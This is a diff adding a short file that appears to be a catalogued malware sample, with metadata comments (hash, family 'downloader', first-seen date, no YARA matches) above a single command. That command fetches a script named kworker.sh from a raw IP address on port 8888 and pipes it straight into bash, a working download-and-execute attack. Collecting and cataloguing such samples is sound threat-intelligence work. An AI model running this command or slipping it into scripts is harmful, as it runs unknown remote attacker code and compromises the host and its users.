@@ -1,0 +1,10 @@
+# sha256: 94ae0bd31514b30a0d8347ca6cce2c2aba02a9c3104058829a58c99b5f15f92a
+# family: downloader
+# kind: script
+# size_bytes: 51
+# first_seen: 2026-07-21 15:42:34.485577 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+curl -s http://89.117.134.46:8888/kworker.sh | bash
